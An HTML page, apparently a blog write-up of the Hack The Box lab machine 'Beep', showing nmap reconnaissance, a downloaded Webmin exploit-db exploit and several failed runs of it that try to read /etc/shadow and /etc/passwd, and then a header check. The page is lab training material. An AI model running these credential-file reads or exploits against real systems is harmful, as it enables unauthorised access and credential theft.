@@ -1,0 +1,1279 @@
+<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta name="google-site-verification" content="uA_65eRzkHXUyK5QY2Pz3N0D7u0dyMoAHD_SQtaPvVA"> <title>Beep</title> <meta name="description" content="Exploited Elastix LFI vulnerability."> <meta name="keywords" content="cybersecurity, CTF, web security, reverse engineering, pentesting, Linux, Python, malware analysis, exploit development"> <meta name="author" content="Biscotti Diskette"> <meta name="google-site-verification" content="uA_65eRzkHXUyK5QY2Pz3N0D7u0dyMoAHD_SQtaPvVA"> <meta property="og:type" content="website"> <meta property="og:title" content="Beep"> <meta property="og:description" content="Exploited Elastix LFI vulnerability."> <meta property="og:url" content="https://biscottidiskette.github.io/boxes/89_beep/"> <meta property="og:image" content="https://biscottidiskette.github.io/assets/img/social-preview.png"> <meta property="og:site_name" content="Biscotti Diskette"> <meta name="twitter:card" content="summary_large_image"> <meta name="twitter:title" content="Beep"> <meta name="twitter:description" content="Exploited Elastix LFI vulnerability."> <meta name="twitter:image" content="https://biscottidiskette.github.io/assets/img/social-preview.png"> <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Person",
+  "name": "Biscotti Diskette",
+  "url": "https://biscottidiskette.github.io",
+  "sameAs": [
+    
+  ],
+  "jobTitle": "Cybersecurity Researcher",
+  "worksFor": {
+    "@type": "Organization",
+    "name": "Independent",
+    "url": "https://biscottidiskette.github.io"
+  },
+  "image": "https://biscottidiskette.github.io/assets/img/social-preview.png",
+  "description": "Exploited Elastix LFI vulnerability."
+}
+</script> <meta name="google-site-verification" content="uA_65eRzkHXUyK5QY2Pz3N0D7u0dyMoAHD_SQtaPvVA"> <meta http-equiv="Permissions-Policy" content="interest-cohort=()"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Beep | Biscotti Diskette </title> <meta name="author" content="Biscotti Diskette"> <meta name="description" content="Exploited Elastix LFI vulnerability."> <meta name="keywords" content="cybersecurity, CTF, web security, reverse engineering, pentesting, Linux, Python, malware analysis, exploit development"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="/assets/img/frontpage/Logo3.png?4f879aeff848659581251777fe0ab074"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="stylesheet" href="/assets/css/terminal.css?bebbf314b8406d78caf98717f86a33c1"> <link rel="canonical" href="https://biscottidiskette.github.io/boxes/89_beep/"> <script src="/assets/js/theme.js?9a0c749ec5240d9cda97bc72359a72c0"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
+    initTheme();
+  </script> <title>Beep</title> <meta name="description" content="Exploited Elastix LFI vulnerability."> <meta name="keywords" content="cybersecurity, CTF, web security, reverse engineering, pentesting, Linux, Python, malware analysis, exploit development"> <meta name="author" content="Biscotti Diskette"> <meta name="google-site-verification" content="uA_65eRzkHXUyK5QY2Pz3N0D7u0dyMoAHD_SQtaPvVA"> <meta property="og:type" content="website"> <meta property="og:title" content="Beep"> <meta property="og:description" content="Exploited Elastix LFI vulnerability."> <meta property="og:url" content="https://biscottidiskette.github.io/boxes/89_beep/"> <meta property="og:image" content="https://biscottidiskette.github.io/assets/img/social-preview.png"> <meta property="og:site_name" content="Biscotti Diskette"> <meta name="twitter:card" content="summary_large_image"> <meta name="twitter:title" content="Beep"> <meta name="twitter:description" content="Exploited Elastix LFI vulnerability."> <meta name="twitter:image" content="https://biscottidiskette.github.io/assets/img/social-preview.png"> <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Person",
+  "name": "Biscotti Diskette",
+  "url": "https://biscottidiskette.github.io",
+  "sameAs": [
+    
+  ],
+  "jobTitle": "Cybersecurity Researcher",
+  "worksFor": {
+    "@type": "Organization",
+    "name": "Independent",
+    "url": "https://biscottidiskette.github.io"
+  },
+  "image": "https://biscottidiskette.github.io/assets/img/social-preview.png",
+  "description": "Exploited Elastix LFI vulnerability."
+}
+</script> </head> <body class="fixed-top-nav sticky-bottom-footer"> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> Biscotti Diskette </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item active"> <a class="nav-link" href="/boxes/">boxes <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/certifications/">certs </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repos </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/contact/">contact </a> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">Beep</h1> <p class="post-description">Exploited Elastix LFI vulnerability.</p> </header> <article> <div class="row justify-content-sm-center"> <div class="col-sm-4 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/beep/logo.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="HTB Beep" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <h2>Link</h2> <p><a href="https://app.hackthebox.com/machines/Beep" rel="external nofollow noopener" target="_blank">Room Link</a></p> <p><br></p> <h2>Process</h2> <p><br> Let’s dial in on some vulnerabilities. Time to tackle Beep.</p> <p>Let’s run nmap and try to identify some sweet, juicy services.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-42417"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-42417')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-42417')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-42417')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-42417')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-42417">
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ sudo nmap -sC -sV -A -O -oN nmap 10.129.229.183                 
+[sudo] password for kali: 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-17 14:58 +1100
+Nmap scan report for 10.129.229.183
+Host is up (0.32s latency).
+Not shown: 988 closed tcp ports (reset)
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
+|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
+25/tcp    open  smtp?
+|_smtp-commands: Couldn't establish connection on port 25
+80/tcp    open  http       Apache httpd 2.2.3
+|_http-server-header: Apache/2.2.3 (CentOS)
+|_http-title: Did not follow redirect to https://10.129.229.183/
+110/tcp   open  pop3?
+111/tcp   open  rpcbind    2 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2            111/tcp   rpcbind
+|   100000  2            111/udp   rpcbind
+|   100024  1            854/udp   status
+|_  100024  1            857/tcp   status
+143/tcp   open  imap?
+443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+| Not valid before: 2017-04-07T08:22:08
+|_Not valid after:  2018-04-07T08:22:08
+|_http-server-header: Apache/2.2.3 (CentOS)
+|_ssl-date: 2026-01-17T04:03:21+00:00; +8s from scanner time.
+|_http-title: Elastix - Login page
+993/tcp   open  imaps?
+995/tcp   open  pop3s?
+3306/tcp  open  mysql?
+4445/tcp  open  upnotifyp?
+10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+Aggressive OS guesses: Linux 2.6.18 - 2.6.24 (97%), Linux 2.6.5 - 2.6.12 (96%), Linux 2.6.18 (95%), Linux 2.6.9 - 2.6.24 (95%), Linux 2.6.9 - 2.6.30 (95%), Linux 2.6.27 (likely embedded) (95%), Linux 2.6.20 (95%), Linux 2.6.27 (95%), Linux 2.6.30 (95%), Linux 2.6.8 (95%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: 127.0.0.1
+
+Host script results:
+|_clock-skew: 7s
+
+TRACEROUTE (using port 53/tcp)
+HOP RTT       ADDRESS
+1   332.89 ms 10.10.14.1
+2   332.96 ms 10.129.229.183
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 562.99 seconds
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-42417" onclick="terminalOverlayClose('bash-bash-42417')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-42417')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-42417')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-42417')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-42417" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ sudo nmap -sC -sV -A -O -oN nmap 10.129.229.183                 
+[sudo] password for kali: 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-17 14:58 +1100
+Nmap scan report for 10.129.229.183
+Host is up (0.32s latency).
+Not shown: 988 closed tcp ports (reset)
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
+|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
+25/tcp    open  smtp?
+|_smtp-commands: Couldn't establish connection on port 25
+80/tcp    open  http       Apache httpd 2.2.3
+|_http-server-header: Apache/2.2.3 (CentOS)
+|_http-title: Did not follow redirect to https://10.129.229.183/
+110/tcp   open  pop3?
+111/tcp   open  rpcbind    2 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2            111/tcp   rpcbind
+|   100000  2            111/udp   rpcbind
+|   100024  1            854/udp   status
+|_  100024  1            857/tcp   status
+143/tcp   open  imap?
+443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+| Not valid before: 2017-04-07T08:22:08
+|_Not valid after:  2018-04-07T08:22:08
+|_http-server-header: Apache/2.2.3 (CentOS)
+|_ssl-date: 2026-01-17T04:03:21+00:00; +8s from scanner time.
+|_http-title: Elastix - Login page
+993/tcp   open  imaps?
+995/tcp   open  pop3s?
+3306/tcp  open  mysql?
+4445/tcp  open  upnotifyp?
+10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+Aggressive OS guesses: Linux 2.6.18 - 2.6.24 (97%), Linux 2.6.5 - 2.6.12 (96%), Linux 2.6.18 (95%), Linux 2.6.9 - 2.6.24 (95%), Linux 2.6.9 - 2.6.30 (95%), Linux 2.6.27 (likely embedded) (95%), Linux 2.6.20 (95%), Linux 2.6.27 (95%), Linux 2.6.30 (95%), Linux 2.6.8 (95%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: 127.0.0.1
+
+Host script results:
+|_clock-skew: 7s
+
+TRACEROUTE (using port 53/tcp)
+HOP RTT       ADDRESS
+1   332.89 ms 10.10.14.1
+2   332.96 ms 10.129.229.183
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 562.99 seconds
+</pre> </div> </div> <p><br> TCP is half the battle. Run nmap against UDP to see the other major protocol.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4817"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4817')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4817')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4817')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4817')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4817">
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ sudo nmap -sU -sV 10.129.229.183                                
+[sudo] password for kali: 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-17 15:01 +1100
+Nmap scan report for 10.129.229.183
+Host is up (0.32s latency).
+Not shown: 993 closed udp ports (port-unreach)
+PORT      STATE         SERVICE VERSION
+68/udp    open|filtered dhcpc
+69/udp    open          tftp    Netkit tftpd or atftpd
+111/udp   open          rpcbind 2 (RPC #100000)
+123/udp   open          ntp     NTP v4 (secondary server)
+5000/udp  open|filtered upnp
+5060/udp  open|filtered sip
+10000/udp open          webmin  (https on TCP port 10000)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1176.80 seconds
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4817" onclick="terminalOverlayClose('bash-bash-4817')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4817')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4817')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4817')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4817" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ sudo nmap -sU -sV 10.129.229.183                                
+[sudo] password for kali: 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-17 15:01 +1100
+Nmap scan report for 10.129.229.183
+Host is up (0.32s latency).
+Not shown: 993 closed udp ports (port-unreach)
+PORT      STATE         SERVICE VERSION
+68/udp    open|filtered dhcpc
+69/udp    open          tftp    Netkit tftpd or atftpd
+111/udp   open          rpcbind 2 (RPC #100000)
+123/udp   open          ntp     NTP v4 (secondary server)
+5000/udp  open|filtered upnp
+5060/udp  open|filtered sip
+10000/udp open          webmin  (https on TCP port 10000)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1176.80 seconds
+</pre> </div> </div> <p><br> Look-up the Webmin in exploit-db and find an exploit.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/beep/exploitone.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Webmin Exploit" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><a href="https://www.exploit-db.com/exploits/1997" rel="external nofollow noopener" target="_blank">https://www.exploit-db.com/exploits/1997</a></p> <p><br> Download the exploit.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4781"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4781')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4781')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4781')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4781')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4781">
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ wget https://www.exploit-db.com/raw/1997 -O webmin.php                                                           
+--2026-01-17 15:51:28--  https://www.exploit-db.com/raw/1997
+Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
+Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1434 (1.4K) [text/plain]
+Saving to: ‘webmin.php’
+
+webmin.php                                                 100%[========================================================================================================================================&gt;]   1.40K  --.-KB/s    in 0s      
+
+2026-01-17 15:51:29 (45.2 MB/s) - ‘webmin.php’ saved [1434/1434]
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4781" onclick="terminalOverlayClose('bash-bash-4781')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4781')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4781')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4781')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4781" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ wget https://www.exploit-db.com/raw/1997 -O webmin.php                                                           
+--2026-01-17 15:51:28--  https://www.exploit-db.com/raw/1997
+Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
+Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1434 (1.4K) [text/plain]
+Saving to: ‘webmin.php’
+
+webmin.php                                                 100%[========================================================================================================================================&gt;]   1.40K  --.-KB/s    in 0s      
+
+2026-01-17 15:51:29 (45.2 MB/s) - ‘webmin.php’ saved [1434/1434]
+</pre> </div> </div> <p><br> Attempt to run the exploit and fail miserably.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-41223"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-41223')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-41223')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-41223')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-41223')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-41223">
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ php webmin.php 10.129.229.183 10000 https /etc/shadow
+Attacking 10.129.229.183
+---------------------------------
+---------------------------------
+Coded by joffer , http://securitydot.net
+
+# milw0rm.com [2006-07-09]                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ php webmin.php 10.129.229.183 10000 https /etc/shadow\n
+Attacking 10.129.229.183
+---------------------------------
+---------------------------------
+Coded by joffer , http://securitydot.net
+
+# milw0rm.com [2006-07-09]                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ php webmin.php 10.129.229.183 10000 https /etc/passwd  
+Attacking 10.129.229.183
+---------------------------------
+---------------------------------
+Coded by joffer , http://securitydot.net
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-41223" onclick="terminalOverlayClose('bash-bash-41223')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-41223')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-41223')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-41223')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-41223" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ php webmin.php 10.129.229.183 10000 https /etc/shadow
+Attacking 10.129.229.183
+---------------------------------
+---------------------------------
+Coded by joffer , http://securitydot.net
+
+# milw0rm.com [2006-07-09]                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ php webmin.php 10.129.229.183 10000 https /etc/shadow\n
+Attacking 10.129.229.183
+---------------------------------
+---------------------------------
+Coded by joffer , http://securitydot.net
+
+# milw0rm.com [2006-07-09]                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ php webmin.php 10.129.229.183 10000 https /etc/passwd  
+Attacking 10.129.229.183
+---------------------------------
+---------------------------------
+Coded by joffer , http://securitydot.net
+</pre> </div> </div> <p><br> Curl the server on port 80 with the <code class="language-plaintext highlighter-rouge">-I</code> to pull the headers to try and identify technology.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4254"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4254')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4254')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4254')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4254')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4254">
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ curl -I http://10.129.229.183
+HTTP/1.1 302 Found
+Date: Sat, 17 Jan 2026 04:57:32 GMT
+Server: Apache/2.2.3 (CentOS)
+Location: https://10.129.229.183/
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4254" onclick="terminalOverlayClose('bash-bash-4254')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4254')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4254')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4254')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4254" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ curl -I http://10.129.229.183
+HTTP/1.1 302 Found
+Date: Sat, 17 Jan 2026 04:57:32 GMT
+Server: Apache/2.2.3 (CentOS)
+Location: https://10.129.229.183/
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
